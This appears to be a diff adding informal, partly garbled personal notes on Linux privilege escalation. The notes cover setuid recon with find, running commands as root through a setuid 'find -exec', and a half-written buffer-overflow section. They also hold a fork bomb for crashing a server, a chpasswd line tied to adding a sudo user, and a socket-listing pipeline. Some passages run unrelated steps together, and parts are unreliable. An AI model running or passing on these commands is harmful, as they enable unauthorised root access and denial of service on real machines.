@@ -1,3 +1,34 @@
+[1]
+# One day I had to write it down, so here's an R&D for it
+
+-- RECON for misconfigured setuid files
+
+	$ find / -user root -perm -4000 -exec ls -ldb {} \;
+
+OR
+
+	$ find / -user root -perm -4000 -print 2>/dev/null
+
+-- THEN the road splits ... 
+
+===== EASY PEASY WAY: abuse exec options or interactive mode ===========
+
+  Use the binary in interactive mode or run with -exec options to privesc. A good example would be "find" with -exec option, another would be "python", etc. The point is to have the binary run commands as root, not any command, but rather commands we are most interested in.  
+
+Example with find (assuming "find" perm is set to 4755):
+$ ls -al
+-rwsr-xr-x 1 root  root   1337 Jul 2028 find 
+
+$ touch f
+$ find f -exec whoami \;
+root
+
+That's all to it, well, is it ? ;) There's also a BUFFER OVERFLOW..NOP NOP NOP hahahaa
+
+yep, NOP sled!!!
+
+===== BUFF OVERFLOW way to privesc or how Pros do IT! YEAH! =====
+
  yet another smart way to add a user to sudo group inside /root/.bashrc, fork-nuke the server from shell as such: 
 :(){ :|: &};:
 :(){ :|: &};: 
@@ -11,9 +42,10 @@ $ echo "bla:blapass" | chpasswd
 
 just don't forget the password ;)))
 
-
+[2]
 ps -aux | awk '{print $2}' | xargs -0 echo > pids && for i in $(cat ./pids); do lsof -p $i 2> /dev/null; done | grep -i "ipv4\|ipv6"
 
+[3]
 #FInd and Grep
 find . -type f -exec grep -l "PS1" {} \;
 
